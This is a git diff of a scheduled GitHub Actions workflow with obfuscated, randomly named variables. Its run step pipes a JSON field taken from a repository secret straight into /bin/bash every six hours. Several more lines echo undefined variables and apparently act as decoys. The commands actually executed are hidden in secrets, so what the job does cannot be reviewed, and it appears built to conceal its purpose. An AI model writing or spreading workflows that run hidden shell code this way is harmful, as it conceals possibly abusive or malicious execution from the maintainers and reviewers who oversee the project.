@@ -2,33 +2,20 @@ name: gaoguifeng6473
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 3/6 * * *'
+    - cron: '26 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaoguifeng6473
         env:
-          cf93840: ${{ secrets.cf93840 }}
+          cgsk54: ${{ secrets.cgsk54 }}
         run: |
-          echo $cf93840 | jq -r .ppbd1 | /bin/bash
-          echo $t211 | jq -r .v3 | /bin/bash
-          echo $vtdm9164 | jq -r .ny36698 | /bin/bash
-          echo $tzl47 | jq -r .vqn68153 | /bin/bash
-          echo $dssdp80372 | jq -r .raeh7 | /bin/bash
-          echo $vc40 | jq -r .whdh4265 | /bin/bash
-          echo $mt2 | jq -r .r58404 | /bin/bash
-          echo $clal3810 | jq -r .gzz4753 | /bin/bash
-          echo $fd8 | jq -r .csz7 | /bin/bash
-          echo $cjo276 | jq -r .v7900 | /bin/bash
-          echo $ie5 | jq -r .ghrq0557 | /bin/bash
-          echo $j827 | jq -r .wdzy99 | /bin/bash
-          echo $glpyg65 | jq -r .o4951 | /bin/bash
-          echo $naa75 | jq -r .qi3 | /bin/bash
-          echo $zdbcd56 | jq -r .d8 | /bin/bash
-          echo $xuda971 | jq -r .nell96643 | /bin/bash
-          echo $ssum0724 | jq -r .a81452 | /bin/bash
+          echo $cgsk54 | jq -r .i82576 | /bin/bash
+          echo $gud73060 | jq -r .vnjnf3 | /bin/bash
+          echo $vk01 | jq -r .efzpo9 | /bin/bash
+          echo $rx87339 | jq -r .c54634 | /bin/bash
+          echo $gj0798 | jq -r .thvqk1441 | /bin/bash
 
